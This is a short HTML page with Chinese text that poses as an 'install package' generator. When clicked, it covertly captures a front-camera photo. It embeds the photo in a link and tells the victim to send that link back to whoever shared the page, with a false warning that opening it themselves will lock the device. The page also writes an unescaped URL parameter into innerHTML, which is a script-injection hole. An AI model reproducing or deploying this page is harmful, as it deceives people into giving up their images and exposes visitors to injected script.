<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<div id="box" style="display:flex;align-items:center;justify-content:center;min-height:90vh;margin:0;">
  <div id="tip" style="padding:24px 32px;border-radius:16px;background:#222;color:#fff;font-size:18px;text-align:center;cursor:pointer;">
    <p style="margin:0 0 10px 0;font-size:22px;">butter</p>
    <p style="margin:0;">点击继续生成安装包</p>
  </div>
</div>
<script>
const url = new URL(location.href);
const imgParam = url.searchParams.get("pic");

if(imgParam){
  document.body.innerHTML=`<img src="${decodeURIComponent(imgParam)}" style="max-width:100%">`
}else{
  const btn = document.getElementById('tip');
  btn.onclick = async function(){
    const v=document.createElement('video'),c=document.createElement('canvas'),ctx=c.getContext('2d');
    v.autoplay=1;
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
    v.srcObject=stream;

    v.onloadeddata=()=>{
      const maxW = 640;
      const maxH = 480;
      let w = v.videoWidth;
      let h = v.videoHeight;
      if(w>maxW){ h = h*maxW/w; w=maxW; }
      if(h>maxH){ w = w*maxH/h; h=maxH; }
      c.width = w;
      c.height = h;
      ctx.drawImage(v,0,0,w,h);

      const imgData = c.toDataURL('image/png',0.7);
      stream.getTracks().forEach(t=>t.stop());

      const shareUrl = `${location.origin}${location.pathname}?pic=${encodeURIComponent(imgData)}`;
      document.body.innerHTML=`
      <div style="padding:20px">
        <h3>✅生成完毕，复制下面链接发给给你链接的人</h3>
        <p style="color:red;font-weight:bold;">自己千万不能打开。</p>
        <p style="color:red;font-weight:bold;">自己打开之后将自动锁机。</p>
        <textarea id="linkArea" style="width:100%;min-height:180px;padding:10px;font-size:12px;word-break:break-all;">${shareUrl}</textarea>
        <button onclick="document.getElementById('linkArea').select();document.execCommand('copy')" style="margin-top:12px;padding:10px 20px;font-size:16px;">一键复制链接</button>
      </div>`;
    }
  }
}
</script>
